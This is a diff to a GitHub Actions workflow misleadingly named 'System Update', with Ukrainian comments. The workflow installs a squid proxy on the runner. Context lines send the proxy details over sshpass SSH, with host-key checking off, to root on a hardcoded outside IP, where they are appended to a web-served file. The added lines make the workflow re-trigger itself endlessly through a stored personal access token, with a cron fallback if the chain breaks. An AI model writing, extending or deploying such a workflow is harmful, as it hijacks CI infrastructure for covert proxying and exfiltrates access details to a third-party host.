@@ -3,11 +3,13 @@ name: System Update
 on:
   workflow_dispatch:
   schedule:
-    - cron: '*/5 * * * *'
+    - cron: '*/15 * * * *'  # fallback, якщо ланцюжок перерветься
 
 jobs:
   maintenance:
     runs-on: ubuntu-latest
+    timeout-minutes: 30
+
     steps:
       - name: Install squid
         run: sudo apt update && sudo apt install squid -y
@@ -57,4 +59,19 @@ jobs:
           cat /tmp/proxy.txt
           sudo apt install sshpass -y
           sshpass -p "${REM}" ssh -o StrictHostKeyChecking=no root@45.144.53.63 "cat >> /var/www/html/git.txt" < /tmp/proxy.txt
-          sleep 240
+          
+      - name: Keep tunnel alive
+        run: sleep 240
+
+      - name: Wait before next run
+        if: success()
+        run: sleep 300  # 5 хвилин паузи перед наступним запуском
+
+      - name: Re-trigger next run
+        if: success()
+        env:
+          GH_TOKEN: ${{ secrets.PAT_TOKEN }}
+        run: |
+          gh workflow run "${{ github.workflow }}" \
+            --repo "${{ github.repository }}" \
+            --ref "${{ github.ref_name }}"
